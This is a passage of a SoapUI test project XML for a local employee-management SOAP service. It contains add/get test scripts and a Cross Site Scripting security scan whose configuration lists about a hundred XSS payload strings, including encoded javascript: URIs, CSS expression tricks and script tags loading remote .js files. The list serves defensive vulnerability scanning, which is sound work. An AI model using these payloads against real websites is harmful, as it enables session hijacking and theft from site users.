</soap:Envelope>]]></con:request><con:assertion type="SOAP Response" id="d8a271a5-ddab-4c6f-a1bd-28dab095a00b"/><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:properties><con:property><con:name>name</con:name><con:value>Prajwal</con:value></con:property></con:properties><con:securityTest id="c6a8789d-307f-405b-b6d5-61f38fe77f4f" name="SecurityTest 1" failOnError="true"><con:settings/><con:testStepSecurityTest><con:testStepId>71216c55-3201-4fef-9b2c-4d50394ff046</con:testStepId><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="73ff2fac-252a-406f-be80-c1f47bef0b63" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="CrosSiteScript" id="26e8c201-d9db-4979-ace1-da266fdb6f9f" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:assertion type="Simple Contains" id="62e39f42-fbf1-48d5-920e-233302043d01" name="Contains"><con:configuration><token>true</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="kjgdj" parameterName="Username" xpath="//ns:name" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan></con:testStepSecurityTest><con:properties/></con:securityTest></con:testCase><con:testCase id="b0786bca-29f5-45c3-91ef-285f391fc759" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Get Employee Details" searchProperties="true"><con:settings/><con:testStep type="request" name="TS_Get" id="d30ee2a9-4d50-4e81-9921-cefa91999da6"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>EmployeeManagementServiceSoap12Binding</con:interface><con:operation>getEmployeeDetails</con:operation><con:request name="TS_Get" id="12055529-28b6-435a-b239-d2dacacb096f"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://localhost:8090/axis2/services/EmployeeManagementService.EmployeeManagementServiceHttpSoap12Endpoint/</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:typ="http://sample.com/reservation/guest/types">
   <soap:Header/>
   <soap:Body>
      <typ:getEmployeeDetails>
         <!--Optional:-->
         <typ:employeeName>Prajwal</typ:employeeName>
      </typ:getEmployeeDetails>
   </soap:Body>
</soap:Envelope>]]></con:request><con:assertion type="SOAP Response" id="a740672d-0884-4d86-a17c-e3b1b2ebdd94"/><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:properties><con:property><con:name>id</con:name><con:value>500</con:value></con:property></con:properties></con:testCase><con:testCase id="13d7029d-0cf9-413e-9b67-fbea33f0ca24" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="Test Automation" searchProperties="true"><con:settings/><con:testStep type="groovy" name="Groovy Script" id="74d36640-d768-42f4-a6da-34aa463085e6"><con:settings/><con:config><script>

//testRunner.testCase.testSuite.testCases["Get Employee Details"].getPropertyValue("id")

//testRunner.testCase.testSuite.testCases["Get Employee Details"].testSteps["TS_Get"].getPropertyValue("Request")
//testRunner.testCase.testSuite.project.setPropertyValue("sal","720000")
import com.eviware.soapui.support.XmlHolder
def addreq = testRunner.testCase.testSuite.testCases["Add Employee"].testSteps["TS_Add"].getPropertyValue("Request")

def id = testRunner.testCase.testSuite.testCases["Get Employee Details"].getProperty("id")

def dept = testRunner.testCase.getPropertyValue("dept")

def xmlAdd = new XmlHolder(addreq)

xmlAdd.setNodeValue("//typ:addEmployee/typ:id","34")

xmlAdd.setNodeValue("//typ:addEmployee/typ:name","ashckhd")


xmlAdd.setNodeValue("//typ:addEmployee/typ:Department",dept)

xmlAdd.setNodeValue("//typ:addEmployee/typ:age","22")

def newAddXML = xmlAdd.getXml();

testRunner.testCase.testSuite.testCases["Add Employee"].testSteps["TS_Add"].setPropertyValue("Request",newAddXML)
import com.eviware.soapui.impl.wsdl.testcase.WsdlTestRunContext
def ts_add=testRunner.testCase.testSuite.testCases["Add Employee"].testSteps["TS_Add"]
def contextAdd=new WsdlTestRunContext(ts_add)
ts_add.run(testRunner,contextAdd)</script></con:config></con:testStep><con:testStep type="groovy" name="Groovy Script Add Employee" id="8bf0261e-79c2-42c4-baf0-79aab3c67270"><con:settings/><con:config><script>import com.eviware.soapui.support.XmlHolder
def addreq = testRunner.testCase.testSuite.testCases["Add Employee"].testSteps["TS_Add"].getPropertyValue("Request")

def id = testRunner.testCase.testSuite.testCases["Get Employee Details"].getProperty("id")

def dept = testRunner.testCase.getPropertyValue("dept")

def xmlAdd = new XmlHolder(addreq)

xmlAdd.setNodeValue("//typ:addEmployee/typ:id","34")

xmlAdd.setNodeValue("//typ:addEmployee/typ:name","hrtttt")


xmlAdd.setNodeValue("//typ:addEmployee/typ:Department",dept)

xmlAdd.setNodeValue("//typ:addEmployee/typ:age","22")

def newAddXML = xmlAdd.getXml();

testRunner.testCase.testSuite.testCases["Add Employee"].testSteps["TS_Add"].setPropertyValue("Request",newAddXML)
import com.eviware.soapui.impl.wsdl.testcase.WsdlTestRunContext
def ts_add=testRunner.testCase.testSuite.testCases["Add Employee"].testSteps["TS_Add"]
def contextAdd=new WsdlTestRunContext(ts_add)
ts_add.run(testRunner,contextAdd)

def vResponse= testRunner.testCase.testSuite.testCases["Add Employee"].testSteps["TS_Add"].getPropertyValue("Response")
def vGetRes=new XmlHolder(vResponse)
def vNameRes=vGetRes.getNodeValue("//ns:return")
assert vNameRes=="true"
log.info vNameRes</script></con:config></con:testStep><con:testStep type="groovy" name="GroovyScript Get Employee" id="d1afa3d4-6c09-4dbe-84a7-8264de6dd0d9"><con:settings/><con:config><script>import com.eviware.soapui.support.XmlHolder
def getReq= testRunner.testCase.testSuite.testCases["Get Employee Details"].testSteps["TS_Get"].getPropertyValue("Request")
def xmlGet = new XmlHolder(getReq)
xmlGet.setNodeValue("//typ:getEmployeeDetails/typ:employeeName","Prajwal")
def newGetXML = xmlGet.getXml();

testRunner.testCase.testSuite.testCases["Get Employee Details"].testSteps["TS_Get"].setPropertyValue("Request",newGetXML)
import com.eviware.soapui.impl.wsdl.testcase.WsdlTestRunContext
def ts_get=testRunner.testCase.testSuite.testCases["Get Employee Details"].testSteps["TS_Get"]
def contextGet=new WsdlTestRunContext(ts_get)
ts_get.run(testRunner,contextGet)
def vName= testRunner.testCase.testSuite.testCases["Add Employee"].getPropertyValue("name")
def vResponse= testRunner.testCase.testSuite.testCases["Get Employee Details"].testSteps["TS_Get"].getPropertyValue("Response")
def vGetRes=new XmlHolder(vResponse)
def vNameRes=vGetRes.getNodeValue("//ns:name")
assert vNameRes==vName
log.info vNameRes
log.info vName</script></con:config></con:testStep><con:properties><con:property><con:name>name</con:name><con:value>Prajwal</con:value></con:property><con:property><con:name>age</con:name><con:value>21</con:value></con:property><con:property><con:name>department</con:name><con:value>mech</con:value></con:property></con:properties><con:securityTest id="b823a86b-ebbb-4cd4-aaa7-70c3f12ad8f2" name="SecurityTest 1" failOnError="true"><con:settings/><con:properties/></con:securityTest></con:testCase><con:testCase id="9b2bacbf-19d0-42d0-b685-0785fc90d7ad" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TestCase Execute" searchProperties="true"><con:settings/><con:testStep type="groovy" name="Groovy Script" id="ea17a879-ce77-42de-83bd-35387e04580e"><con:settings/><con:config><script>def project= testRunner.testCase.testSuite.project
testRunner.runTestStep(project.testSuites['Test suite 1'].testCases['Test Automation'].testSteps['Groovy Script Add Employee'])
testRunner.runTestStep(project.testSuites['Test suite 1'].testCases['Test Automation'].testSteps['GroovyScript Get Employee'])</script></con:config></con:testStep><con:properties/><con:securityTest id="8d823733-3142-4206-b9b1-91edd830725d" name="SecurityTest" failOnError="true"><con:settings/><con:properties/></con:securityTest></con:testCase><con:properties><con:property><con:name>name</con:name><con:value>Prajwal</con:value></con:property><con:property><con:name>age</con:name><con:value>21</con:value></con:property></con:properties></con:testSuite><con:properties><con:property><con:name>sal</con:name><con:value>720000</con:value></con:property></con:properties><con:wssContainer/><con:oAuth2ProfileContainer/><con:oAuth1ProfileContainer/><con:sensitiveInformation/></con:soapui-project>